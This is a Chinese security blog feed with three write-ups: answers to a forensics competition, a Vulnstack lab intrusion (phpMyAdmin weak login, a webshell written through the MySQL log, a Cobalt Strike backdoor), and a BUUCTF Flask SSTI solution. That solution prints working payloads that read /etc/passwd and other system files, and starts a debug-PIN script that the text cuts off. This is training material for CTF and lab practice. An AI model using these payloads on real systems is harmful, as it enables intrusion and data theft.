plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a-small-miracle-132333.mp3</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca77-1730481702979-8.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca77-1730481702979-8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a77"></p><h5 id="95-单选题-在-windows-7中有多少个文件曾被potplayer-播放-1分"><a class="markdownIt-Anchor" href="#95-单选题-在-windows-7中有多少个文件曾被potplayer-播放-1分">#</a> 95. [单选题] 在 Windows 7 中有多少个文件曾被 potplayer 播放？(1 分)</h5><p>A. 7</p><p>B. 8</p><p>C. 9</p><p>D. 10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B</span><br></pre></td></tr></table></figure><p>在最近访问记录中查找</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca78.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca78.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a78"></p><h5 id="96-填空题-在-windows-7中-potplayer最后播放的文件名-提示-请以与记录相同的名称包括小写字母-阿拉伯数字与符号与文件格式作答-1分"><a class="markdownIt-Anchor" href="#96-填空题-在-windows-7中-potplayer最后播放的文件名-提示-请以与记录相同的名称包括小写字母-阿拉伯数字与符号与文件格式作答-1分">#</a> 96. [填空题] 在 Windows 7 中，potplayer 最后播放的文件名？提示：请以与记录相同的名称 (包括小写字母、阿拉伯数字与符号) 与文件格式作答 (1 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlock-me-149058.mp3</span><br></pre></td></tr></table></figure><p>仿真后打开 potplayer</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca79.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca79.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a79"></p><p>但是我觉得最对的应该是看时间线，过滤 potplayer</p><p>查看这个.dpl 文件，里面记录了 playlist 即为播放列表</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca80.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca80.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a80"></p><h5 id="97-单选题-事件应急小组正在处理一起网络事件-以下哪一个指令是设定取证服务器以作取得内存内容的初步步骤-3分"><a class="markdownIt-Anchor" href="#97-单选题-事件应急小组正在处理一起网络事件-以下哪一个指令是设定取证服务器以作取得内存内容的初步步骤-3分">#</a> 97. [单选题] 事件应急小组正在处理一起网络事件。以下哪一个指令是设定取证服务器以作取得内存内容的初步步骤？(3 分)</h5><p>A. nc -l 4444 &gt;mem126.lime.gz</p><p>B. Insmod lime.ko “pathtcp:4444 format=lime digest=sha256 compress=1”</p><p>C. scp -I ~/DFIRSciAWTest.pem lime.ko <a href="mailto:ec2-duckman@3.137.169.127">ec2-duckman@3.137.169.127</a>:~/scp -I ~/DFIRSciAWTest.pem /usr/bin/nc <a href="mailto:ec2-duckman@3.137.169.127">ec2-duckman@3.137.169.127</a>:~/</p><p>D. ssh duckman@&lt;target_server_ip&gt; “sudo dd if=/dev/mem | gzip -1 -” &gt; memory_dump.gz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C</span><br></pre></td></tr></table></figure><p>大佬的 wp 里面查的 gpt 借用记录一下</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca81.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca81.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a81"></p><h5 id="98-单选题-基于两个sqlite数据库文件cus_202308102034json和date_202308101120json编译一个sqlite脚本找出谁前往目的地莫斯科-3分"><a class="markdownIt-Anchor" href="#98-单选题-基于两个sqlite数据库文件cus_202308102034json和date_202308101120json编译一个sqlite脚本找出谁前往目的地莫斯科-3分">#</a> 98. [单选题] 基于两个 SQLite 数据库文件 “cus_202308102034.json” 和 “date_202308101120.json”，编译一个 SQLite 脚本找出谁前往目的地 “莫斯科 &quot;。 (3 分)</h5><p>A. SELECT c.customer_name, c.destination, datetime(d.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk FROM cus c INNER JOIN date d ON c.destination = d.Destination WHERE c.destination = ‘Moscow’</p><p>B. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk FROM cus INNER JOIN date ON customer_id = <a href="http://date.id">date.id</a> WHERE cus.destination = ‘Moscow’ AND date.Destination = ‘Moscow’ AND date.arrival_timestamp_HK IS NOT NULL AND datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’)</p><p>C. SELECT cus.customer_name, cus.destination, date.arrival_timestamp FROM cus INNER JOIN date ON cus.destination = date.destination；WHERE cus.destination = ‘Moscow’ AND date.Destination = ‘Moscow’</p><p>D. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’) AS arrival_time_hk FROM cus INNER JOIN date ON cus.destination = date.Destination WHERE cus.destination = ‘Moscow’ AND date.Destination = ‘Moscow’ AND date.arrival_timestamp_HK IS NOT NULL AND datetime(date.arrival_timestamp_HK, ‘unixepoch’, ‘localtime’)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure><p>json 导入 mysql，导出 csv，导入 sqlite，执行 sql 语句</p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca82.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca82.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a82"></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca83.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca83.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a83"></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca84.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca84.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a84"></p><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca85.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca85.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a85"></p><p>A 错的原因是查询试图从两个表（cus 和 date）中选择字段，并通过 INNER JOIN 操作将它们连接在一起。然而，它在连接条件中使用了错误的别名。在这个查询中，表 cus 和 date 被分别赋予了别名 c 和 d，但在 ON 子句中，它错误地使用了 c.destination = d.Destination。正确的应该是 c.destination = d.destination。</p><h5 id="99-填空题-写一个powershell脚本以提取正在连接到window-11计算机的可移动设备的记录提取相关的数据如装置名称-制造商-装置详情-硬件编号并用write-host指令显示数据-2分"><a class="markdownIt-Anchor" href="#99-填空题-写一个powershell脚本以提取正在连接到window-11计算机的可移动设备的记录提取相关的数据如装置名称-制造商-装置详情-硬件编号并用write-host指令显示数据-2分">#</a> 99. [填空题] 写一个 Powershell 脚本以提取正在连接到 Window 11 计算机的可移动设备的记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号，并用 “Write-Host” 指令显示数据。 (2 分)</h5><p><img src="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca86.png" class="lazyload" data-srcset="/2024/10/20/MeiYa2023-Individual/D:%5CDr4x3zz%5Csource_posts%5CMeiYa2023-Individual%5Ca86.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a86"></p><p>不会</p><h5 id="100填空题-编写一个powershell脚本从windows-server-2012-r2获取具有管理员权限的所有使用者活动-使用where-object命令来进一步过滤事件如果事件的第9个属性与内建的administrator账户的安全标识符sid匹配则确保只选择与管理员活动相关的事件-3分"><a class="markdownIt-Anchor" href="#100填空题-编写一个powershell脚本从windows-server-2012-r2获取具有管理员权限的所有使用者活动-使用where-object命令来进一步过滤事件如果事件的第9个属性与内建的administrator账户的安全标识符sid匹配则确保只选择与管理员活动相关的事件-3分">#</a> 100.[填空题] 编写一个 PowerShell 脚本从 Windows Server 2012 R2 获取具有管理员权限的所有使用者活动。使用 &quot;Where-Object&quot; 命令来进一步过滤事件，如果事件的第 9 个属性与内建的 Administrator 账户的安全标识符（SID）匹配，则确保只选择与管理员活动相关的事件。 (3 分)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8</span><br></pre></td></tr></table></figure><p>不会</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现一下，准备一下 2024 的美亚&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;官方传送门：&lt;a href=&quot;https://www.meiyacup.cn/Mo_index_gci_36.html&quot;&gt;历年赛题及解析 - 美亚杯&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1、&lt;a href=&quot;htt</summary>
      
    
    
    
    <category term="取证" scheme="https://dr4x3zz.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="取证" scheme="https://dr4x3zz.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>Vulnstack红日靶场</title>
    <link href="https://dr4x3zz.github.io/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"/>
    <id>https://dr4x3zz.github.io/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</id>
    <published>2024-06-06T11:41:48.000Z</published>
    <updated>2024-06-07T18:24:52.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-网络配置"><a class="markdownIt-Anchor" href="#一-网络配置">#</a> 一、网络配置</h2><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a2.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>参考小破站 BV13W4y1t7qB</p><h2 id="二-信息收集"><a class="markdownIt-Anchor" href="#二-信息收集">#</a> 二、信息收集</h2><p>在 c 盘目录找到 phpstudy，打开看看本地 127.0.0.1</p><p>注：需要重启一次 win7 不然 phpstudy 无法使用</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a1.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到绝对路径 C:/phpstudy/WWW</p><p>用 nmap 扫一下看看有没有什么有用的信息，扫描 22 网段，端口</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a3.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>开放了 mysql 端口 3306 和本地的 80 端口也就是上面的 php 探针</p><p>用弱口令尝试登录 mysql</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a4.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a5.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>dirb 扫一下目录收集信息</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a6.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="三-漏洞利用"><a class="markdownIt-Anchor" href="#三-漏洞利用">#</a> 三、漏洞利用</h2><p>存在 phpmyadmin，访问 root:root 登录</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a7.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查询日志信息，尝试在日志里写入 shell</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a8.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>日志关闭，打开日志</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a9.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>指定 mysql 查询日志的输出文件路径设置为指定路径下的 muma.php</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a10.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>写入一句话木马</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a11.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>访问一下看看上传是否成功</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a12.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>蚁剑连接</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a13.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a13"></p><p>配合 CS，配置服务端（kali_ip 创建密码）</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a14.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>配置客户端</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a15.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>编辑监听器，点击</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a16.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>add</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a17.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>点击 攻击 - 生成后门 - windows 可执行程序</p><p>选择 web 监听器保存 exe 文件在桌面</p><p><img src="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a18.png" class="lazyload" data-srcset="/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/a18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>蚁剑</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一-网络配置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-网络配置&quot;&gt;#&lt;/a&gt; 一、网络配置&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/2024/06/06/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%</summary>
      
    
    
    
    <category term="渗透" scheme="https://dr4x3zz.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透" scheme="https://dr4x3zz.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题5</title>
    <link href="https://dr4x3zz.github.io/2024/04/17/buuctf%E5%88%B7%E9%A2%985/"/>
    <id>https://dr4x3zz.github.io/2024/04/17/buuctf%E5%88%B7%E9%A2%985/</id>
    <published>2024-04-17T11:57:08.000Z</published>
    <updated>2024-04-23T12:33:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="gyctf2020flaskapp"><a class="markdownIt-Anchor" href="#gyctf2020flaskapp">#</a> [GYCTF2020]FlaskApp</h2><span id="more"></span><p>提到 flask 肯定会想到 ssti，但是这类题目接触的特别少，这里存一下：ssti 详解与例题以及绕过 payload 大全 https://blog.csdn.net/weixin_54515836/article/details/113778233</p><p>留一个：Python 模板注入 (SSTI) 深入学习 https://xz.aliyun.com/t/6885?time__1311=n4%2BxnD0DRDyB5q053b7e0QKQY5DtKKezDcYD&amp;alichlgref=https%3A%2F%<a href="http://2Fwww.bing.com">2Fwww.bing.com</a>%2F</p><p>本题点击提示 f12 可以看到 pin 这样的字眼，和 flask 结合查了一下，是和 debug 相关，简单来说就是要通过 ssti 注入的手段得到 debug 的 pin 码</p><p>想要拿到 pin 码必须知道：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">usrname: 就是启动这个 Flask的用户</span><br><span class="line">modname： 一般为flask.app</span><br><span class="line">getattr(app, “__name__”, app.__class__.__name__)：python该值一般为Flask 值一般不变</span><br><span class="line">getattr(mod, &#x27;file&#x27;, None)：为flask目录下的一个app.py的绝对路径</span><br><span class="line">uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</span><br><span class="line">get_machine_id() ：/etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值</span><br><span class="line">假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值，假如是Docker机，那么为 /proc/self/cgroup docker行</span><br></pre></td></tr></table></figure><p>输入这个 pin 码的入口在哪？随便在解码的地方输入一个非 base64 可以解码的内容就会报错，在右上角有一个小窗口，点击就可以</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e1.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>歪打正着还找到了 app.py 的绝对路径 <code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></p><p>尝试利用 ssti 读取 app.py 的内容（三种读取方法）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;app.py&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;app.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64 加密，然后在解码的窗口注入</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e2.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里的内容好像不影响做题</p><p>读取 <code>/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e3.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>发现用户名是 flaskweb</p><p>读 /sys/class/net/eth0/address 来获得 mac 的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/sys/class/net/eth0/address&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e4.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>将 fa93c2fad795 转为 10 进制得到 275512538355605</p><p>因为本题是 docker 环境，所以读取 <code>/proc/self/cgroup</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#x27;open&#x27;](&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e5.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>不知道为什么别人都可以 docker 读取 id 我这就没有，记录一下做法吧，得到这个 id，就写脚本把 pin 跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377871320&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;31c24e0fd34a09126aa47d88e21b8b28efcce8acd630632e4e4a9baddff38757&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span 